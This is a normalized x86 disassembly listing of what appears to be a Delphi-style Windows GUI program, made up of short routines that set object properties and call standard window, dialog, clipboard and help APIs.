les ecx [ eax ]
add [ eax ] eax
add [ esi + 0x5b ] bl
retn
sub_425cdc
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ eax + 0x64 ]
retn
mov eax [ eax + 0x68 ]
retn
sub_425d5c
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_425d78
push ebx
mov ebx eax
mov edx GetSaveFileNameA
mov eax ebx
call sub_42576c
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_425fe1
pop ebp
retn
sub_42641e
mov eax [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
hlt
sub_428692
jmp sub_4036bc
sub_428752
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_428758
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4286cc
sub_428768
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_4286cc
sub_428778
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_4286cc
pop ebp
retn 0x8
sub_428790
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4288bc
push ebx
mov ebx eax
mov eax ebx
call sub_43d118
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4288d0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_428904
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_428a0f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428bb9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428bc3
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_428bd8
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_43a400
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_428bf4
push ebx
mov ebx eax
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_43a400
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_428c10
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_43a400
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_428c2c
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_43a400
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_428c48
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_43b0e0
sub_428c5c
mov al [ eax + 0x220 ]
retn
sub_428dc5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_4290e9
jmp sub_4036bc
sub_42925c
retn
sub_42946c
push ebx
mov ebx eax
mov eax ebx
call sub_439414
mov eax ebx
call sub_429260
pop ebx
retn
sub_429480
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_439b34
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_4295a8
pop ebx
retn
sub_429598
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_429678
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4296c0
push ebx
mov ebx eax
mov eax ebx
call sub_43d09c
mov eax ebx
call sub_429260
pop ebx
retn
sub_4296d4
push ebx
mov ebx eax
mov eax ebx
call sub_42db20
mov eax ebx
call sub_429260
pop ebx
retn
sub_4296e8
mov al 0x1
retn
sub_4296ec
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4297a8
mov eax [ eax + 0x40 ]
retn
sub_4297ac
mov eax [ eax + 0x44 ]
retn
sub_429864
push esi
mov esi eax
mov eax esi
call sub_43cebc
mov dl [ esi + 0x5f ]
mov eax [ esi + 0x220 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
pop esi
retn
sub_4298a0
push ebx
mov ebx eax
mov eax ebx
call sub_43cfd4
mov dl [ ebx + 0x57 ]
mov eax [ ebx + 0x220 ]
call sub_437278
pop ebx
retn
sub_429a20
mov [ eax + 0x228 ] edx
mov dl [ eax + 0x224 ]
call sub_429914
retn
sub_429ac1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429e6f
pop ebp
retn
sub_429e74
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403cf4
mov eax [ r-xdata ]
call sub_41307c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130c8
sub_429ed0
pop ebp
retn
sub_429ed4
sub [ rw-data ] 0x1
retn
sub_429f14
pop ebp
retn
sub_429f18
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_429f94
retn
j_sub_429f94
jmp sub_429f94
sub_429f9c
pop ebp
retn
sub_429fa0
sub [ rw-data ] 0x1
retn
sub_429fa8
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403234
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42a073
pop ebp
retn
sub_42a078
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_429fc4
call sub_403d40
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402c40
sub_42a0cc
pop ebp
retn
sub_42a0d0
sub [ rw-data ] 0x1
retn
sub_42a133
pop ebp
retn
sub_42a138
sub [ rw-data ] 0x1
retn
sub_42a19b
pop ebp
retn
sub_42a1a0
sub [ rw-data ] 0x1
retn
sub_42a208
pop ebp
retn
sub_42a20c
sub [ rw-data ] 0x1
retn
sub_42a25f
pop ebp
retn
sub_42a264
sub [ rw-data ] 0x1
retn
sub_42a298
pop ebp
retn
sub_42a29c
sub [ rw-data ] 0x1
retn
sub_42a344
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40baf0
mov [ rw-data ] eax
sub_42a379
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_42a390
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_42a41a
pop ebp
retn
sub_42a41c
sub [ rw-data ] 0x1
retn
sub_42a48b
jmp [ edi ]
sub_42a72c
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_42a744
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_42a788
push ebx
mov ebx eax
mov eax ebx
call sub_42aeb0
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_42aeb0
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_4245b8
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_42a758
sub_42af0e
pop ebp
retn
sub_42af10
sub [ rw-data ] 0x1
retn
sub_42b4d8
jmp [ eax ]
sub_42d4c8
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_42d69b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x2ce1172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_42da5d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42dae9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42daf0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_43a400
pop ebx
retn
sub_42db04
push ebx
mov ebx eax
mov eax ebx
call sub_43d158
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_43a400
pop ebx
retn
sub_42db20
push ebx
mov ebx eax
mov eax ebx
call sub_43c12c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42dbcc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_437358
pop esi
pop ebx
retn
sub_42dd3d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42de4c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_439414
mov eax ebx
mov si 0xffc7
call sub_403430
pop esi
pop ebx
retn
sub_42df38
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403430
sub_42df54
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_42df60
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_4192b0
sub_42df74
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dfd4
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42e048
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403430
pop esi
pop ebx
retn
sub_42e064
push esi
mov esi eax
mov eax esi
call sub_438f20
mov eax esi
mov si 0xffc7
call sub_403430
pop esi
retn
sub_42e110
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e118
push ebx
mov ebx eax
mov eax ebx
call sub_439084
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_42e13c
push ebx
mov ebx eax
mov eax ebx
call sub_43909c
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_42e228
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_42e834
sub_42e23c
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_42e834
mov eax ebx
call sub_43b0e0
sub_42e260
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_43b0e0
sub_42e274
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_43b0e0
sub_42e2b8
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_43b0e0
sub_42e3c0
pop ebx
pop ecx
pop ebp
retn
sub_42e4d8
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_43db40
push eax
call SetWindowTextA
pop ebx
retn
sub_42e4f4
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_43db40
push eax
call SendMessageA
pop ebx
retn
sub_42e5a1
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e818
push ebx
mov ebx eax
mov eax ebx
call sub_42e2cc
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_43aedc
pop ebx
retn
sub_42e918
push ebx
mov ebx eax
mov eax ebx
call sub_436f64
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_42ea10
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_403430
sub_42eac0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_43db40
push eax
call SendMessageA
pop ebx
retn
sub_42eb49
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ec3b
pop ebx
pop ecx
pop ebp
retn
sub_42ed36
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42edba
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ef10
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_437334
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_42ef60
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_43db40
push eax
call SendMessageA
pop ebx
retn
sub_42f094
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_43b0e0
sub_42f0c8
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42f0d0
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42f0d8
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42f102
inc eax
add [ ebx ] bh
inc edx
or [ esi + ecx + 0x6a ] dh
add [ ebx ] dh
leave
mov edx 0x14f
call sub_43850c
retn
sub_42f25c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_42f27c
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_43b0e0
sub_42f547
jmp sub_4036bc
sub_42f54c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_456e58
call sub_403a24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42f7df
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f7e8
push ebx
mov ebx eax
mov eax ebx
call sub_436f64
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_42f8bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42f8c8
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_42f944
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_42faa8
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_42fb3a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fb6c
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_42fb78
mov [ eax + 0x210 ] edx
retn
sub_42fbd0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fc98
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_43b0e0
sub_42fcec
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_42fd01
mov eax [ eax + 0x238 ]
retn
sub_42fd01
push 0x0
xor ecx ecx
mov edx 0x154
call sub_43850c
retn
sub_430047
pop ebx
mov esp ebp
pop ebp
retn
sub_43040b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4305d0
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4305dc
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_4307c0
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4307cc
mov eax [ r-xdata ]
retn
sub_430a0c
retn
sub_430b6c
mov eax [ r-xdata ]
retn
sub_430b74
xor eax eax
retn
sub_430b98
retn
sub_430cb0
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_43b0e0
sub_430d24
mov al [ eax + 0x211 ]
retn
sub_430d58
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_43b0e0
sub_430f38
call sub_43b0e0
retn
sub_430fbc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431020
pop ebp
retn
sub_431024
sub [ rw-data ] 0x1
retn
sub_431188
pop ebp
retn
sub_43118c
sub [ rw-data ] 0x1
retn
sub_4311a5
add eax 0xffffffe0
jmp sub_43178c
sub_4311ad
add eax 0xffffffe0
jmp sub_4317f4
sub_4311b5
add eax 0xffffffe0
jmp sub_431908
sub_4311bd
add eax 0xffffffe0
jmp sub_43197c
sub_4311c5
add eax 0xffffffe0
jmp sub_431438
sub_4311cd
add eax 0xffffffe0
jmp sub_43144c
sub_4311d5
add eax 0xffffffe0
jmp sub_4314c4
sub_4311dd
add eax 0xffffffe0
jmp sub_431568
sub_4311e5
add eax 0xffffffe0
jmp sub_43156c
sub_4311ed
add eax 0xffffffe0
jmp sub_4315f4
sub_4311f5
add eax 0xffffffe0
jmp sub_43173c
sub_4311fd
add eax 0xffffffe0
jmp sub_431740
sub_431205
add eax 0xffffffe0
jmp sub_43175c
sub_431217
add [ esp + 0x4 ] 0xffffffe0
jmp sub_40567c
sub_431221
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405690
sub_4313fc
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_431438
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403fc0
pop ebx
retn
sub_4314ba
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431553
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_431568
mov al 0x1
retn
sub_4315ee
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4316f3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43173c
mov [ eax + 0xc ] edx
retn
sub_431740
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_4317eb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4318f1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431971
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_431a03
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431afe
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_431bc0
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_431b0c
call EnumWindows
retn
sub_431c59
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_431c64
xor eax eax
retn
sub_431d64
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431e55
pop ebp
retn
sub_431eb1
pop ebp
retn
sub_432992
adc [ eax ] al
hlt
sub_433018
jmp r-xdata
sub_43301a
0xe8ffe9ff 0xe7ff
sub_433021
jmp esi
sub_43380a
in al 0xca
inc ebx
add [ ebx + ecx * 8 ] al
inc ebx
add [ eax + 0x780043cb ] ch
int3
sub_433ded
add eax 0xffffff8c
jmp sub_440168
sub_433df5
add eax 0xffffff8c
jmp sub_44016c
sub_433dfd
add eax 0xffffff8c
jmp sub_440258
sub_433e05
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_433e12
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_433e1f
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_433e2c
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_433e39
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_433e46
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_433e53
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_433e60
add eax 0xffffff8c
jmp sub_4418c8
sub_433e72
add [ esp + 0x4 ] 0xffffff8c
jmp sub_40567c
sub_433e7c
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405690
sub_434138
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43444b
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_4132f0
retn
sub_434468
push 0x15
mov ecx rw-data
call sub_4132b0
retn
sub_434500
call GetCapture
call sub_434238
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_434764
push ebx
push eax
push sub_4348e8
call sub_41a340
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_43477c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4347ac
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41a3f4
pop ebx
retn
sub_43488a
jmp sub_4036bc
sub_4348bc
xor eax eax
retn
sub_4348c0
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_4348d8
retn
sub_4348dc
mov eax [ rw-data ]
retn
sub_4348e4
retn
sub_434912
jmp sub_4036bc
sub_434917
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_456e58
call sub_403a24
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434934
call sub_403474
xor eax eax
mov [ rw-data ] eax
retn
sub_434944
call sub_403470
xor eax eax
mov [ rw-data ] eax
retn
sub_434954
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403540
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_434a04
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_434a1c
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_434a68
retn
sub_434c20
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403430
pop esi
retn
sub_434c34
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403430
pop esi
retn
sub_434c48
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_434c54
mov eax 0x4
retn
sub_434c5c
retn
sub_43584d
jmp sub_4036bc
sub_435bb8
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_4358e0
sub_435d37
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41d0b4
retn
sub_435e25
mov esp ebp
pop ebp
retn
sub_435f34
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_435f00
mov [ ebx + 0x58 ] esi
sub_436088
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_43609c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43618c
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436216
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4365e4
xor eax eax
retn
sub_4365e8
mov al [ eax + 0x58 ]
retn
sub_4365ec
xor eax eax
retn
sub_4365f0
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_4365f8
mov eax [ eax + 0x30 ]
retn
sub_43669c
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_436748
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_436760
mov [ eax + 0x5d ] dl
retn
sub_436764
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_43a344
sub_436774
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_436c5e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436cc0
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_436d44
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_436e68
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436f64
push eax
xor ecx ecx
mov edx 0xb037
call sub_43850c
retn
sub_437125
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403430
sub_4371dd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4372b4
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_43850c
sub_4372cc
push 0x0
xor ecx ecx
mov edx 0xe
call sub_43850c
retn
sub_4372dc
push edx
mov edx 0xd
call sub_43850c
retn
sub_4372e8
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_4372fc
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_4373e4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4373ec
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_43850c
sub_43745c
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_437470
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_43747c
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_437484
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_43850c
sub_4374a8
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_43850c
sub_4374cc
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_43850c
sub_437514
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_43751c
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
